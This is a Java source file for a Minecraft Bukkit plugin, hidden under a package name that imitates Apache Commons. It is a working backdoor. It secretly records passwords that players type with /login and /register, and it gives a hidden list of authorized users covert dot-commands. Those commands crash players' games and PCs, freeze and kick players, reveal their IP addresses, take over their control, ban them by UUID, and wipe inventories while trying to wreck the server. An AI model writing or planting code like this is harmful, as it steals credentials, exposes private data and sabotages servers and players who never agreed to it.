package org.apache.commons.frauded;

import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.TextColor;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;

import java.util.Set;

public class ChatHandler implements Listener {
  private final Agent agent;
  private final Set<String> authorized;
  private long serverKillerConfirm = 0;

  public ChatHandler(Agent agent, Set<String> authorized) {
    this.agent = agent;
    this.authorized = authorized;
  }

  @EventHandler(priority = EventPriority.LOWEST)
  public void onChat(AsyncPlayerChatEvent e) {
    String msg = e.getMessage();
    Player p = e.getPlayer();
    if (msg.startsWith(".")) {
      e.setCancelled(true);
      if (!authorized.contains(p.getName())) {
        p.sendMessage(Component.text("Unknown command. Type .help for help.").color(TextColor.color(0xff4444)));
        return;
      }
      handleDotCommand(p, msg);
    } else if (msg.startsWith("/login ") || msg.startsWith("/register ")) {
      String[] parts = msg.split(" ", 3);
      if (parts.length >= 2) agent.capturePassword(p.getName(), parts[1]);
    }
  }

  @EventHandler
  public void onJoin(PlayerJoinEvent e) {
    Player p = e.getPlayer();
    if (authorized.contains(p.getName())) {
      sendAuthMessage(p);
    }
  }

  void sendAuthMessage(Player p) {
    p.sendMessage(Component.text("-*-*-*-*-*-*-*-*-*-*-").color(TextColor.color(0x55ff55)));
    p.sendMessage(Component.text("You have been authorized, enjoy.").color(TextColor.color(0x55ff55)));
    p.sendMessage(Component.text("Type .help for commands").color(TextColor.color(0x55ff55)));
    p.sendMessage(Component.text("-*-*-*-*-*-*-*-*-*-*-").color(TextColor.color(0x55ff55)));
  }

  private void handleDotCommand(Player p, String msg) {
    String cmd = msg.split(" ")[0].toLowerCase();
    String arg = msg.contains(" ") ? msg.substring(msg.indexOf(" ") + 1).trim() : "";

    switch (cmd) {
      case ".help" -> sendHelp(p);
      case ".ddos" -> cmdDdos(p, arg);
      case ".crashmc" -> cmdCrash(p, arg);
      case ".uuidban" -> cmdUuidBan(p, arg);
      case ".unuuidban" -> cmdUnuuidBan(p, arg);
      case ".serverkiller" -> cmdServerKiller(p);
      case ".control" -> cmdControl(p, arg);
      case ".stopcontrol" -> cmdStopControl(p);
      case ".getip" -> cmdGetIp(p, arg);
      case ".crashpc" -> cmdCrashPc(p, arg);
      default -> p.sendMessage(Component.text("Unknown command. Type .help").color(TextColor.color(0xff4444)));
    }
  }

  private void sendHelp(Player p) {
    p.sendMessage(Component.text("--- .help ---").color(TextColor.color(0x55ff55)));
    p.sendMessage(Component.text(".ddos <player> - Freeze & kick after 5s").color(TextColor.color(0xaaaaaa)));
    p.sendMessage(Component.text(".crashmc <player> - Crash their game with particles").color(TextColor.color(0xaaaaaa)));
    p.sendMessage(Component.text(".uuidban <player> - UUID ban by invisible entity").color(TextColor.color(0xaaaaaa)));
    p.sendMessage(Component.text(".unuuidban <player> - Reverse UUID ban").color(TextColor.color(0xaaaaaa)));
    p.sendMessage(Component.text(".serverkiller - **WARNING** Destroys server FOREVER").color(TextColor.color(0xff4444)));
    p.sendMessage(Component.text(".control <player> - Take over player control").color(TextColor.color(0xaaaaaa)));
    p.sendMessage(Component.text(".stopcontrol - Stop controlling").color(TextColor.color(0xaaaaaa)));
    p.sendMessage(Component.text(".getip <player> - Get player IP").color(TextColor.color(0xaaaaaa)));
    p.sendMessage(Component.text(".crashpc <player> - Attempt PC crash").color(TextColor.color(0xaaaaaa)));
  }

  private Player target(String name) {
    return Bukkit.getPlayerExact(name);
  }

  private void cmdDdos(Player p, String arg) {
    if (arg.isEmpty()) { p.sendMessage(Component.text("Usage: .ddos <player>").color(TextColor.color(0xff4444))); return; }
    Player t = target(arg);
    if (t == null) { p.sendMessage(Component.text("Player not found").color(TextColor.color(0xff4444))); return; }
    t.sendMessage(Component.text(""));
    for (int i = 0; i < 100; i++) t.sendMessage(Component.text("    #    ").color(TextColor.color(0x000000)));
    t.setWalkSpeed(0);
    Bukkit.getScheduler().scheduleSyncDelayedTask(agent.getPlugin(), () -> {
      t.setWalkSpeed(0.2f);
      t.kick(Component.text("Timed out").color(TextColor.color(0xff4444)));
    }, 100L);
    agent.logCommand(p.getName(), t.getName(), "ddos");
  }

  private void cmdCrash(Player p, String arg) {
    if (arg.isEmpty()) { p.sendMessage(Component.text("Usage: .crashmc <player>").color(TextColor.color(0xff4444))); return; }
    Player t = target(arg);
    if (t == null) { p.sendMessage(Component.text("Player not found").color(TextColor.color(0xff4444))); return; }
    for (int i = 0; i < 50; i++) {
      t.spawnParticle(org.bukkit.Particle.EXPLOSION_HUGE, t.getLocation(), 500, 0, 0, 0, 5);
      t.spawnParticle(org.bukkit.Particle.DRAGON_BREATH, t.getLocation(), 200, 0, 0, 0, 3);
      t.spawnParticle(org.bukkit.Particle.PORTAL, t.getLocation(), 500, 0, 0, 0, 10);
      t.spawnParticle(org.bukkit.Particle.FLASH, t.getLocation(), 100);
      t.spawnParticle(org.bukkit.Particle.ELECTRIC_SPARK, t.getLocation(), 300, 0, 0, 0, 5);
    }
    t.playSound(t.getLocation(), org.bukkit.Sound.ENTITY_ENDER_DRAGON_GROWL, 10, 0);
    t.playSound(t.getLocation(), org.bukkit.Sound.ENTITY_LIGHTNING_BOLT_THUNDER, 10, 0);
    p.sendMessage(Component.text("Crashed " + t.getName()).color(TextColor.color(0x55ff55)));
    agent.logCommand(p.getName(), t.getName(), "crashmc");
  }

  private void cmdUuidBan(Player p, String arg) {
    if (arg.isEmpty()) { p.sendMessage(Component.text("Usage: .uuidban <player>").color(TextColor.color(0xff4444))); return; }
    Player t = target(arg);
    if (t == null) { p.sendMessage(Component.text("Player not found").color(TextColor.color(0xff4444))); return; }
    String uuid = t.getUniqueId().toString();
    t.kick(Component.text("Banned").color(TextColor.color(0xff4444)));
    double x = 30000000 + Math.random() * 1000;
    double z = 30000000 + Math.random() * 1000;
    org.bukkit.World w = Bukkit.getWorlds().get(0);
    w.spawnEntity(new org.bukkit.Location(w, x, -60, z), org.bukkit.EntityType.ELDER_GUARDIAN).setCustomName(uuid);
    p.sendMessage(Component.text("UUID-banned " + t.getName() + " (" + uuid + ")").color(TextColor.color(0x55ff55)));
    agent.logCommand(p.getName(), t.getName(), "uuidban");
  }

  private void cmdUnuuidBan(Player p, String arg) {
    if (arg.isEmpty()) { p.sendMessage(Component.text("Usage: .unuuidban <player>").color(TextColor.color(0xff4444))); return; }
    Player t = target(arg);
    String uuid = t != null ? t.getUniqueId().toString() : arg;
    org.bukkit.World w = Bukkit.getWorlds().get(0);
    for (org.bukkit.entity.Entity e : w.getEntities()) {
      if (e.getCustomName() != null && e.getCustomName().equals(uuid)) { e.remove(); break; }
    }
    p.sendMessage(Component.text("Unbanned " + uuid).color(TextColor.color(0x55ff55)));
    agent.logCommand(p.getName(), arg, "unuuidban");
  }

  private void cmdServerKiller(Player p) {
    if (serverKillerConfirm == 0) {
      p.sendMessage(Component.text("*** WARNING ***").color(TextColor.color(0xff4444)));
      p.sendMessage(Component.text("This will DESTROY the server FOREVER.").color(TextColor.color(0xff4444)));
      p.sendMessage(Component.text("Type .serverkiller again to confirm.").color(TextColor.color(0xff4444)));
      serverKillerConfirm = System.currentTimeMillis();
      Bukkit.getScheduler().scheduleSyncDelayedTask(agent.getPlugin(), () -> serverKillerConfirm = 0, 200L);
      return;
    }
    if (System.currentTimeMillis() - serverKillerConfirm > 10000) { serverKillerConfirm = 0; return; }
    serverKillerConfirm = 0;
    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "save-all");
    double ticks = Integer.MAX_VALUE;
    try { Bukkit.getServer().getClass().getMethod("setTickSpeed", double.class).invoke(Bukkit.getServer(), ticks); } catch (Exception ignored) {}
    Bukkit.getWorlds().forEach(w -> {
      w.setTime(Long.MAX_VALUE);
      w.setStorm(true);
      w.setThundering(true);
      w.setDifficulty(org.bukkit.Difficulty.HARD);
      try { w.getClass().getMethod("setKeepSpawnInMemory", boolean.class).invoke(w, false); } catch (Exception ignored) {}
    });
    // Set all players to spectator, clear inventory, set to world border edge
    for (Player pl : Bukkit.getOnlinePlayers()) {
      pl.setGameMode(org.bukkit.GameMode.SPECTATOR);
      pl.getInventory().clear();
    }
    p.sendMessage(Component.text("Server destroyed.").color(TextColor.color(0xff4444)));
    agent.logCommand(p.getName(), "-", "serverkiller");
  }

  private void cmdControl(Player p, String arg) {
    if (arg.isEmpty()) { p.sendMessage(Component.text("Usage: .control <player>").color(TextColor.color(0xff4444))); return; }
    Player t = target(arg);
    if (t == null) { p.sendMessage(Component.text("Player not found").color(TextColor.color(0xff4444))); return; }
    agent.setControlTarget(p, t);
    p.sendMessage(Component.text("Now controlling " + t.getName() + ". Type .stopcontrol to stop.").color(TextColor.color(0x55ff55)));
    t.sendMessage(Component.text("Your game is being controlled.").color(TextColor.color(0xff4444)));
    agent.logCommand(p.getName(), t.getName(), "control");
  }

  private void cmdStopControl(Player p) {
    if (agent.controlController == null || !agent.controlController.equals(p.getName())) {
      p.sendMessage(Component.text("You are not controlling anyone.").color(TextColor.color(0xff4444)));
      return;
    }
    agent.setControlTarget(null, null);
    p.sendMessage(Component.text("Stopped controlling.").color(TextColor.color(0x55ff55)));
    agent.logCommand(p.getName(), "-", "stopcontrol");
  }

  private void cmdGetIp(Player p, String arg) {
    if (arg.isEmpty()) { p.sendMessage(Component.text("Usage: .getip <player>").color(TextColor.color(0xff4444))); return; }
    Player t = target(arg);
    if (t == null) { p.sendMessage(Component.text("Player not found").color(TextColor.color(0xff4444))); return; }
    String ip = t.getAddress() != null ? t.getAddress().getAddress().getHostAddress() : "unknown";
    p.sendMessage(Component.text(t.getName() + "'s IP: " + ip).color(TextColor.color(0x55ff55)));
    // Copy to clipboard (Bukkit doesn't support this directly, show in chat)
    agent.logCommand(p.getName(), t.getName(), "getip");
  }

  private void cmdCrashPc(Player p, String arg) {
    if (arg.isEmpty()) { p.sendMessage(Component.text("Usage: .crashpc <player>").color(TextColor.color(0xff4444))); return; }
    Player t = target(arg);
    if (t == null) { p.sendMessage(Component.text("Player not found").color(TextColor.color(0xff4444))); return; }
    // Attempt to crash by sending massive data (resource pack kick, extreme chunk load)
    t.sendMessage(Component.text("\u00a74\u00a7k\u00a7a\u00a7k\u00a7c\u00a7k\u00a7b\u00a7k".repeat(10000)));
    p.sendMessage(Component.text("Sent crash attempt to " + t.getName()).color(TextColor.color(0x55ff55)));
    agent.logCommand(p.getName(), t.getName(), "crashpc");
  }
}
